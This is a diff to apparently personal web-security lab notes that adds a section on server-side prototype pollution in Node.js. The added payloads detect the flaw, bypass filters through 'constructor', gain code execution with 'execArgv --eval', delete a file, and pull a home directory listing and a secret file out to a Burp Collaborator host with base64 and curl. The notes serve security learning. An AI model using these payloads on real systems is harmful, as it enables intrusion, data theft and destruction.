@@ -94,6 +94,7 @@
 - Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing, Web Cache Poison]
 - HTTP request smuggler: scan request smuggling vulnerabilities > right clikc on the a request and click 'Launch smuggle probe', then watch the extension's output pane. [HTTP request smuggler]
 - JWT Editor, JSON Web Token [JWT Attack]
+- Server-Side Prototype Pollution Scanner: identifies server side prototype pollution vulnerabilities  [Prototype pollution]  
   
 ## SQL Injection
 **How to detect**     
@@ -5372,10 +5373,68 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
      Response
      {"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}  
      ``` 
-- dd
-- dd
-- dd
-- dd
+- **Detecting server-side prototype pollution** without polluted property reflection
+  - confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior.
+  - modify the JSON in a way that intentionally breaks the syntax. Receive an error response in which the body contains a JSON error.
+  - Modify your injected property to try polluting the prototype with your own distinct status
+    ```
+    "__proto__": {
+        "status":555
+    }
+    ```
+  - Successfully polluted the prototype
+    ```
+    {"error":{"expose":false,"statusCode":500,"status":500,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 
+    1RP\",\"country\":\"UK\",\"sessionId\":\"QmLEUDsaAn5HN2pLr2NzsssmxKDT6dqQ\"\r\n\"__proto__\": {\r\n    \"status\":\"555\"\r\n}\r\n}","type":"entity.parse.failed","foo":"bar"}}
+    ```
+- **Bypassing flawed input filters** for server-side prototype pollution
+  - In Repeater, add a new property to the JSON `"json spaces":10` > switch to Raw tab in response > no impact
+    ```
+    "__proto__": {
+       "json spaces":10
+    }
+    ```
+  - Modify the request to try polluting the prototype via the `constructor` property
+    ```
+    {
+       "address_line_1":"Wiener HQ",
+       "constructor": {
+          "prototype": {
+            "isAdmin":true
+          }
+        }
+    }
+    ```
+  - Object doesn't have its own isAdmin property, but has instead inherited it from the polluted prototype.
+- **Remote code execution** via server-side prototype pollution
+  - Identify a prototype pollution source
+    ```
+    "__proto__": {
+       "json spaces":10
+    }
+    ```
+  - Probe for remote code execution `execArgv` property adds the `--eval` argument to the spawned child process > burp collaborator received DNS interactions > confirming the RFC
+    ```
+    "__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+        ]
+    }
+    ```
+  - Exploit 
+    `"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"`
+- **Exfiltrating sensitive data** via server-side prototype pollution
+  - Probe for remote code execution > trigger maintenance jobs > jobs failed > collaborator received interactions
+    ```
+    "__proto__": {
+       "shell":"vim",
+       "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
+    }
+    ```
+  - Leak the hidden file name > repeater, modify the payload in malicious "input" > send request > run maintainance job > collaborator body > decode the content > leak carlos' home directory > "node_apps", "secret"
+    `"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`
+  - Exfiltrate the contents of the secret file
+    `"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"`
 
 ## Essential Skills
 Content for Essential Skills...
